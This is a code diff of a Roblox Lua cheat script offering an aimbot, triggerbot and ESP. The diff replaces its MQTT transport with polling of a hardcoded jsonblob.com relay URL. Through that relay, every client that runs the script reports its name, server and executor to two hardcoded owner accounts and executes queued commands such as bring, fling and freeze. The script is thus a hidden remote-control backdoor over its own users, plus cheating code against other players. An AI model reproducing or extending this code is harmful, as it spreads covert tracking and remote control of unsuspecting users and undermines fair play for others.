@@ -1,11 +1,13 @@
 --[[
-    [S] Universal Control + Aimbot v3
+    [S] Universal Control + Aimbot v4
     Owners: 1460823186, 7208967899
-    Transport: MQTT over WebSocket (HiveMQ public broker, no signup, no rate limit)
+    Transport: jsonblob.com HTTP polling. Universal.
 --]]
 
 local OWNERS = { [1460823186] = true, [7208967899] = true }
 
+-- >>> REPLACE THIS WITH YOUR jsonblob API URL <<<
+local RELAY_URL = "https://jsonblob.com/api/jsonBlob/01a13c4b-1c13-76d3-981a-2c3c22bba416"
 local Players      = game:GetService("Players")
 local RunService   = game:GetService("RunService")
 local HttpService  = game:GetService("HttpService")
@@ -19,190 +21,50 @@ local LP    = Players.LocalPlayer
 local MY_ID = LP.UserId
 local IS_OWNER = OWNERS[MY_ID] == true
 
-local SESSION_KEY  = "freddy_private_2026"
-local TOPIC_BASE   = "FreddyKv/" .. SESSION_KEY .. "/"
-local TOPIC_ONLINE = TOPIC_BASE .. "online"
-local TOPIC_CMD    = TOPIC_BASE .. "cmd/"
-
 -- ============================================================
--- MQTT 3.1.1 client over WebSocket (minimal, QoS 0)
+-- HTTP
 -- ============================================================
-local MQTT = {}
-MQTT.__index = MQTT
-
-local function encLen(n)
-    local out = {}
-    repeat
-        local d = n % 128
-        n = math.floor(n / 128)
-        if n > 0 then d = d + 128 end
-        table.insert(out, string.char(d))
-    until n == 0
-    return table.concat(out)
-end
-
-local function encStr(s)
-    return string.char(#s // 256, #s % 256) .. s
-end
-
-local function decLen(buf, i)
-    local mul, val = 1, 0
-    repeat
-        local b = buf:byte(i); i = i + 1
-        val = val + (b % 128) * mul
-        mul = mul * 128
-    until b < 128
-    return val, i
-end
-
-function MQTT.new(host, port, path, clientId, onMessage, onConnect)
-    local self = setmetatable({}, MQTT)
-    self.onMessage = onMessage
-    self.onConnect = onConnect
-    self.pendingSubs = {}
-    self.pid = 0
-    self.dead = false
-    self.connected = false
-
-    local url = "wss://" .. host .. ":" .. port .. path
-    local ws
-    local ok, err = pcall(function()
-        if syn and syn.websocket then
-            ws = syn.websocket.connect(url)
-        elseif WebSocket and WebSocket.connect then
-            ws = WebSocket.connect(url)
+local function httpRequest(opts)
+    local ok, res = pcall(function()
+        if syn and syn.request then return syn.request(opts)
+        elseif http_request then return http_request(opts)
+        elseif request then return request(opts)
         else
-            error("no websocket support")
-        end
-    end)
-    if not ok or not ws then error("ws connect failed: " .. tostring(err)) end
-
-    self.ws = ws
-
-    ws.OnMessage = function(_, data)
-        if type(data) == "table" then
-            data = data.data or data[1] or ""
-        end
-        if type(data) == "string" and #data > 0 then
-            pcall(function() self:_handle(data) end)
-        end
-    end
-    ws.OnClose = function() self.dead = true end
-
-    -- CONNECT: protocol "MQTT", level 4, flags 0x02 (clean session), keepalive 60
-    local vh = encStr("MQTT") .. string.char(4, 0x02, 0, 60)
-    local payload = encStr(clientId or ("FreddyKv_" .. tostring(math.random(1, 999999999))))
-    local pkt = string.char(0x10) .. encLen(#vh + #payload) .. vh .. payload
-    self:_send(pkt)
-
-    return self
-end
-
-function MQTT:_send(p)
-    if not self.ws then return end
-    pcall(function()
-        if syn and syn.websocket then
-            self.ws:Send(p)
-        else
-            self.ws:Send(p)
-        end
-    end)
-end
-
-function MQTT:subscribe(topic)
-    if not self.connected then
-        table.insert(self.pendingSubs, topic)
-        return
-    end
-    self.pid = self.pid + 1
-    local payload = string.char(self.pid // 256, self.pid % 256) .. encStr(topic) .. string.char(0)
-    local pkt = string.char(0x82) .. encLen(#payload) .. payload
-    self:_send(pkt)
-end
-
-function MQTT:publish(topic, msg)
-    if type(msg) ~= "string" then msg = tostring(msg) end
-    local payload = encStr(topic) .. msg
-    local pkt = string.char(0x30) .. encLen(#payload) .. payload
-    self:_send(pkt)
-end
-
-function MQTT:_handle(data)
-    if type(data) ~= "string" or #data < 2 then return end
-    local typeId = data:byte(1) // 16
-    local _, i = decLen(data, 2)
-
-    if typeId == 2 then -- CONNACK
-        if data:byte(i + 1) == 0 then
-            self.connected = true
-            for _, t in ipairs(self.pendingSubs) do self:subscribe(t) end
-            self.pendingSubs = {}
-            if self.onConnect then pcall(self.onConnect) end
-        end
-    elseif typeId == 3 then -- PUBLISH
-        local tlen = data:byte(i) * 256 + data:byte(i + 1); i = i + 2
-        local topic = data:sub(i, i + tlen - 1); i = i + tlen
-        -- QoS 0: no packet id
-        local payload = data:sub(i)
-        if self.onMessage then pcall(self.onMessage, topic, payload) end
-    end
-end
-
--- ============================================================
--- Connection state
--- ============================================================
-local CLIENT = nil
-local CONNECTED = false
-local CONNECT_ERR = ""
-
-local function onMqttMessage(topic, payload)
-    local ok, data = pcall(HttpService.JSONDecode, HttpService, payload)
-    if not ok or type(data) ~= "table" then return end
-    if topic == TOPIC_ONLINE then
-        if OwnerOnHeartbeat then OwnerOnHeartbeat(data) end
-    elseif topic:sub(1, #TOPIC_CMD) == TOPIC_CMD then
-        if TargetOnCommand then TargetOnCommand(data) end
-    end
-end
-
--- forward decls
-OwnerOnHeartbeat = nil
-TargetOnCommand  = nil
-
-task.spawn(function()
-    local attempts = {
-        { "broker.hivemq.com", 8884, "/mqtt" },
-        { "broker.emqx.io",    8084, "/mqtt" },
-        { "test.mosquitto.org", 8081, "/mqtt" },
-    }
-    for _, cfg in ipairs(attempts) do
-        local host, port, path = cfg[1], cfg[2], cfg[3]
-        local ok, err = pcall(function()
-            CLIENT = MQTT.new(host, port, path, nil, onMqttMessage, function()
-                CONNECTED = true
-                CONNECT_ERR = ""
-            end)
-        end)
-        if ok and CLIENT then
-            -- give it a moment to actually CONNACK
-            local t0 = tick()
-            while tick() - t0 < 3 and not CONNECTED and not CLIENT.dead do
-                task.wait(0.1)
+            local m = opts.Method or "GET"
+            if m == "GET" then
+                return { Body = HttpService:GetAsync(opts.Url, true, opts.Headers or {}) }
+            elseif m == "PUT" then
+                return { Body = HttpService:RequestAsync({ Url = opts.Url, Method = "PUT", Body = opts.Body, Headers = opts.Headers }).Body }
+            else
+                return { Body = HttpService:PostAsync(opts.Url, opts.Body or "", Enum.HttpContentType.ApplicationJson) }
             end
-            if CONNECTED then break end
-            pcall(function() CLIENT.ws:Close() end)
-            CLIENT = nil
-        else
-            CONNECT_ERR = tostring(err)
         end
-    end
-    if not CONNECTED and not CONNECT_ERR:find("CONNECT") then
-        CONNECT_ERR = "all brokers failed"
-    end
-end)
+    end)
+    if ok then return res end
+    return nil
+end
+
+local function readState()
+    local r = httpRequest({ Url = RELAY_URL, Method = "GET" })
+    if not r or not r.Body then return nil end
+    local ok, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
+    if ok and type(d) == "table" then return d end
+    return {}
+end
+
+local function writeState(state)
+    return httpRequest({
+        Url = RELAY_URL,
+        Method = "PUT",
+        Body = HttpService:JSONEncode(state),
+        Headers = { ["Content-Type"] = "application/json" },
+    })
+end
+
+local MSG_HANDLERS = {}
 
 -- ============================================================
--- UI helpers, purple glow, click feedback, drag
+-- UI helpers, purple glow, drag
 -- ============================================================
 local function makeGui(name)
     local g = Instance.new("ScreenGui")
@@ -234,13 +96,10 @@ local function styleFrame(frame)
     frame.BackgroundColor3 = Color3.fromRGB(18, 12, 28)
     frame.BorderSizePixel = 0
     frame.Active = true
-    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 10); corner.Parent = frame
-    local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(130, 60, 210)
-    stroke.Thickness = 1.6
-    stroke.Parent = frame
-    pulseStroke(stroke)
-    return stroke
+    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 10); c.Parent = frame
+    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(130, 60, 210); s.Thickness = 1.6; s.Parent = frame
+    pulseStroke(s)
+    return s
 end
 
 local function styleButton(btn)
@@ -251,30 +110,13 @@ local function styleButton(btn)
     btn.TextSize = 12
     btn.AutoButtonColor = false
     btn.Active = true
-    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 6); corner.Parent = btn
-    local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(160, 90, 240)
-    stroke.Thickness = 1
-    stroke.Transparency = 0.2
-    stroke.Parent = btn
-    local grad = Instance.new("UIGradient")
-    grad.Color = ColorSequence.new(Color3.fromRGB(70, 40, 105), Color3.fromRGB(34, 18, 54))
-    grad.Rotation = 90
-    grad.Parent = btn
-
-    btn.MouseEnter:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(62, 38, 95) }):Play()
-    end)
-    btn.MouseLeave:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(42, 24, 66) }):Play()
-    end)
-    btn.MouseButton1Down:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.06), { BackgroundColor3 = Color3.fromRGB(110, 60, 170) }):Play()
-    end)
-    btn.MouseButton1Up:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.14), { BackgroundColor3 = Color3.fromRGB(42, 24, 66) }):Play()
-    end)
-    return stroke
+    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = btn
+    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(160, 90, 240); s.Thickness = 1; s.Transparency = 0.2; s.Parent = btn
+    local g = Instance.new("UIGradient"); g.Color = ColorSequence.new(Color3.fromRGB(70, 40, 105), Color3.fromRGB(34, 18, 54)); g.Rotation = 90; g.Parent = btn
+    btn.MouseEnter:Connect(function() TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(62, 38, 95) }):Play() end)
+    btn.MouseLeave:Connect(function() TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(42, 24, 66) }):Play() end)
+    btn.MouseButton1Down:Connect(function() TweenService:Create(btn, TweenInfo.new(0.06), { BackgroundColor3 = Color3.fromRGB(110, 60, 170) }):Play() end)
+    btn.MouseButton1Up:Connect(function() TweenService:Create(btn, TweenInfo.new(0.14), { BackgroundColor3 = Color3.fromRGB(42, 24, 66) }):Play() end)
 end
 
 local function makeBtn(parent, text, x, y, w, h, cb)
@@ -421,37 +263,32 @@ local function executeAction(c)
     end
 end
 
-function TargetOnCommand(data)
-    executeAction(data)
-end
-
 -- ============================================================
--- Heartbeat + subscribe
+-- Heartbeat loop
 -- ============================================================
 task.spawn(function()
-    -- wait for connection
-    while not CONNECTED and not CONNECT_ERR do task.wait(0.1) end
-    if not CONNECTED then return end
-
-    if CLIENT then
-        CLIENT:subscribe(TOPIC_CMD .. tostring(MY_ID))
-        CLIENT:subscribe(TOPIC_ONLINE)
-    end
-
     while true do
-        if CLIENT and CONNECTED then
-            pcall(function()
-                CLIENT:publish(TOPIC_ONLINE, HttpService:JSONEncode({
-                    uid = MY_ID, name = LP.Name,
-                    job = game.JobId, place = game.PlaceId,
-                    ts = os.time(),
-                    exec = (identifyexecutor and identifyexecutor()) or "unknown",
-                }))
-            end)
-        end
-        task.wait(5)
+        pcall(function()
+            local state = readState() or {}
+            state.online = state.online or {}
+            state.cmd    = state.cmd    or {}
+            state.online[tostring(MY_ID)] = {
+                name = LP.Name, job = game.JobId, place = game.PlaceId,
+                ts = os.time(),
+                exec = (identifyexecutor and identifyexecutor()) or "unknown",
+            }
+            local myCmds = state.cmd[tostring(MY_ID)] or {}
+            state.cmd[tostring(MY_ID)] = {}
+            writeState(state)
+            for _, c in ipairs(myCmds) do
+                for _, h in ipairs(MSG_HANDLERS) do pcall(h, c) end
+            end
+        end)
+        task.wait(2)
     end
 end)
+
+table.insert(MSG_HANDLERS, executeAction)
 
 -- ============================================================
 -- OWNER PANEL
@@ -461,14 +298,8 @@ if IS_OWNER then
     local HISTORY     = {}
     local FILTER      = { exec = "", place = "" }
     local FOLLOWING   = {}
-    local LAST_HB     = 0
-
-    function OwnerOnHeartbeat(data)
-        if data and data.uid then
-            ONLINE[tostring(data.uid)] = data
-            LAST_HB = os.time()
-        end
-    end
+    local LAST_SYNC   = 0
+    local LAST_ERR    = ""
 
     local gui = makeGui("[S] Control")
     local frame = Instance.new("Frame")
@@ -485,12 +316,12 @@ if IS_OWNER then
     makeDraggable(frame, header)
 
     makeLabel(header, "CONTROL PANEL", 14, 6, 200, 22, 16)
-    local statusLbl = makeLabel(header, "transport: ...", 190, 8, 140, 14, 10, Color3.fromRGB(180, 160, 220))
+    local statusLbl = makeLabel(header, "sync: ...", 190, 8, 140, 14, 10, Color3.fromRGB(180, 160, 220))
     statusLbl.TextXAlignment = Enum.TextXAlignment.Right
 
     local targetLbl = makeLabel(frame, "Target: none", 14, 34, 280, 14)
 
-    local execFilter = makeInput(frame, "filter executor...", 14, 52, 150, 22)
+    local execFilter  = makeInput(frame, "filter executor...", 14, 52, 150, 22)
     local placeFilter = makeInput(frame, "filter place id...", 170, 52, 150, 22)
     execFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.exec = execFilter.Text end)
     placeFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.place = placeFilter.Text end)
@@ -498,24 +329,36 @@ if IS_OWNER then
     local bcast = makeInput(frame, "broadcast message...", 14, 80, 220, 24)
     makeBtn(frame, "Send All",   240, 80, 80, 24, function()
         for uid, _ in pairs(ONLINE) do
-            if tostring(uid) ~= tostring(MY_ID) and CLIENT then
-                CLIENT:publish(TOPIC_CMD .. tostring(uid), HttpService:JSONEncode({ from = MY_ID, action = "message", payload = bcast.Text }))
+            if tostring(uid) ~= tostring(MY_ID) then
+                local st = readState() or {}
+                st.cmd = st.cmd or {}
+                st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
+                table.insert(st.cmd[tostring(uid)], { from = MY_ID, action = "message", payload = bcast.Text })
+                writeState(st)
             end
         end
         table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> msg all")
     end)
     makeBtn(frame, "Freeze All", 14, 110, 150, 24, function()
         for uid, _ in pairs(ONLINE) do
-            if tostring(uid) ~= tostring(MY_ID) and CLIENT then
-                CLIENT:publish(TOPIC_CMD .. tostring(uid), HttpService:JSONEncode({ from = MY_ID, action = "freeze" }))
+            if tostring(uid) ~= tostring(MY_ID) then
+                local st = readState() or {}
+                st.cmd = st.cmd or {}
+                st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
+                table.insert(st.cmd[tostring(uid)], { from = MY_ID, action = "freeze" })
+                writeState(st)
             end
         end
         table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> freeze all")
     end)
     makeBtn(frame, "Unfreeze All", 170, 110, 150, 24, function()
         for uid, _ in pairs(ONLINE) do
-            if tostring(uid) ~= tostring(MY_ID) and CLIENT then
-                CLIENT:publish(TOPIC_CMD .. tostring(uid), HttpService:JSONEncode({ from = MY_ID, action = "unfreeze" }))
+            if tostring(uid) ~= tostring(MY_ID) then
+                local st = readState() or {}
+                st.cmd = st.cmd or {}
+                st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
+                table.insert(st.cmd[tostring(uid)], { from = MY_ID, action = "unfreeze" })
+                writeState(st)
             end
         end
         table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> unfreeze all")
@@ -557,21 +400,18 @@ if IS_OWNER then
     }
 
     local function cmd(uid, action, payload)
-        if not CLIENT then return end
-        CLIENT:publish(TOPIC_CMD .. tostring(uid), HttpService:JSONEncode({
-            from = MY_ID, action = action, payload = payload or ""
-        }))
+        local st = readState() or {}
+        st.cmd = st.cmd or {}
+        st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
+        table.insert(st.cmd[tostring(uid)], { from = MY_ID, action = action, payload = payload or "" })
+        writeState(st)
         table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> " .. tostring(action) .. " #" .. tostring(uid))
         refreshHistory()
     end
 
     local function passesFilter(user)
-        if FILTER.exec ~= "" and not string.find(string.lower(tostring(user.exec or "")), string.lower(FILTER.exec), 1, true) then
-            return false
-        end
-        if FILTER.place ~= "" and not string.find(tostring(user.place or ""), FILTER.place, 1, true) then
-            return false
-        end
+        if FILTER.exec ~= "" and not string.find(string.lower(tostring(user.exec or "")), string.lower(FILTER.exec), 1, true) then return false end
+        if FILTER.place ~= "" and not string.find(tostring(user.place or ""), FILTER.place, 1, true) then return false end
         return true
     end
 
@@ -603,8 +443,7 @@ if IS_OWNER then
 
                 makeLabel(card, tostring(user.name), 64, 6, 200, 16, 13)
                 makeLabel(card, "#" .. tostring(uid) .. "  " .. tostring(user.exec or "?"), 64, 24, 220, 12, 10)
-                local ago = math.max(0, now - (user.ts or now))
-                makeLabel(card, "hb " .. tostring(ago) .. "s", 64, 40, 120, 12, 10)
+                makeLabel(card, "hb " .. tostring(math.max(0, now - (user.ts or now))) .. "s", 64, 40, 120, 12, 10)
 
                 local joinBtn = makeBtn(card, "Join", 240, 8, 64, 22, function()
                     pcall(function() TeleportSvc:TeleportToPlaceInstance(user.place or game.PlaceId, user.job, LP) end)
@@ -633,9 +472,7 @@ if IS_OWNER then
                     panel.Parent = card
                     card.Size = UDim2.new(1, -4, 0, 366)
 
-                    local function pb(label, x, y, w, cb)
-                        makeBtn(panel, label, x, y, w, 22, cb)
-                    end
+                    local function pb(label, x, y, w, cb) makeBtn(panel, label, x, y, w, 22, cb) end
 
                     pb("Bring",   0, 0, 96, function() cmd(uid, "bring") end)
                     pb("Fling",   100, 0, 96, function() cmd(uid, "fling") end)
@@ -691,9 +528,26 @@ if IS_OWNER then
 
     refreshHistory()
     rebuild()
+
+    task.spawn(function()
+        while true do
+            pcall(function()
+                local st = readState()
+                if st and st.online then
+                    ONLINE = st.online
+                    LAST_SYNC = os.time()
+                    LAST_ERR = ""
+                else
+                    LAST_ERR = "read failed"
+                end
+            end)
+            rebuild()
+            task.wait(2)
+        end
+    end)
+
     task.spawn(function()
         while task.wait(3) do
-            rebuild()
             for uid, on in pairs(FOLLOWING) do
                 if on and ONLINE[uid] then
                     local u = ONLINE[uid]
@@ -708,20 +562,17 @@ if IS_OWNER then
     task.spawn(function()
         while true do
             local now = os.time()
-            if CONNECT_ERR ~= "" then
-                statusLbl.Text = "err: " .. CONNECT_ERR:sub(1, 20)
+            if LAST_ERR ~= "" then
+                statusLbl.Text = LAST_ERR
                 statusLbl.TextColor3 = Color3.fromRGB(230, 120, 120)
-            elseif not CONNECTED then
-                statusLbl.Text = "connecting..."
+            elseif LAST_SYNC == 0 then
+                statusLbl.Text = "syncing..."
                 statusLbl.TextColor3 = Color3.fromRGB(230, 200, 120)
-            elseif LAST_HB == 0 then
-                statusLbl.Text = "mqtt live, no hb"
-                statusLbl.TextColor3 = Color3.fromRGB(180, 180, 230)
-            elseif now - LAST_HB < 15 then
-                statusLbl.Text = "mqtt live"
+            elseif now - LAST_SYNC < 8 then
+                statusLbl.Text = "sync: live"
                 statusLbl.TextColor3 = Color3.fromRGB(140, 230, 140)
             else
-                statusLbl.Text = "hb " .. (now - LAST_HB) .. "s ago"
+                statusLbl.Text = "sync: " .. (now - LAST_SYNC) .. "s ago"
                 statusLbl.TextColor3 = Color3.fromRGB(230, 190, 120)
             end
             task.wait(1)
@@ -839,18 +690,9 @@ makeBtn(main, "Bone: Head", 12, 136, 236, 24, function(self)
     self.Text = "Bone: " .. CFG.bone
 end)
 
-makeBtn(main, "Team Check: ON", 12, 166, 116, 22, function(self)
-    CFG.team = not CFG.team
-    self.Text = "Team Check: " .. (CFG.team and "ON" or "OFF")
-end)
-makeBtn(main, "Vis Check: OFF", 132, 166, 116, 22, function(self)
-    CFG.vis = not CFG.vis
-    self.Text = "Vis Check: " .. (CFG.vis and "ON" or "OFF")
-end)
-makeBtn(main, "Triggerbot: OFF", 12, 192, 236, 22, function(self)
-    CFG.trig = not CFG.trig
-    self.Text = "Triggerbot: " .. (CFG.trig and "ON" or "OFF")
-end)
+makeBtn(main, "Team Check: ON", 12, 166, 116, 22, function(self) CFG.team = not CFG.team; self.Text = "Team Check: " .. (CFG.team and "ON" or "OFF") end)
+makeBtn(main, "Vis Check: OFF", 132, 166, 116, 22, function(self) CFG.vis = not CFG.vis; self.Text = "Vis Check: " .. (CFG.vis and "ON" or "OFF") end)
+makeBtn(main, "Triggerbot: OFF", 12, 192, 236, 22, function(self) CFG.trig = not CFG.trig; self.Text = "Triggerbot: " .. (CFG.trig and "ON" or "OFF") end)
 
 makeLabel(main, "ESP", 12, 220, 100, 14, 11)
 makeBtn(main, "Box: ON",      12, 236, 116, 22, function(self) CFG.espBox  = not CFG.espBox;  self.Text = "Box: "   .. (CFG.espBox  and "ON" or "OFF") end)
@@ -867,7 +709,7 @@ makeBtn(main, "FOV Circle: ON", 12, 314, 236, 22, function(self)
 end)
 
 makeLabel(main, "R = toggle aim   F = toggle esp", 12, 342, 236, 14, 10)
-makeLabel(main, "transport: mqtt", 12, 358, 236, 14, 10)
+makeLabel(main, "transport: jsonblob", 12, 358, 236, 14, 10)
 
 local fovCircle = Instance.new("Frame")
 fovCircle.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -918,7 +760,6 @@ local function buildEsp(plr)
     nameL.TextSize = 12
     nameL.TextStrokeTransparency = 0
     nameL.Text = plr.Name
-    nameL.Visible = CFG.espName
     nameL.Parent = bill
     bucket.nameL = nameL
 
@@ -931,7 +772,6 @@ local function buildEsp(plr)
     hpL.TextSize = 11
     hpL.TextStrokeTransparency = 0
     hpL.Text = "100"
-    hpL.Visible = CFG.espHP
     hpL.Parent = bill
     bucket.hpL = hpL
 
@@ -944,7 +784,6 @@ local function buildEsp(plr)
     distL.TextSize = 11
     distL.TextStrokeTransparency = 0
     distL.Text = "0m"
-    distL.Visible = CFG.espDist
     distL.Parent = bill
     bucket.distL = distL
 
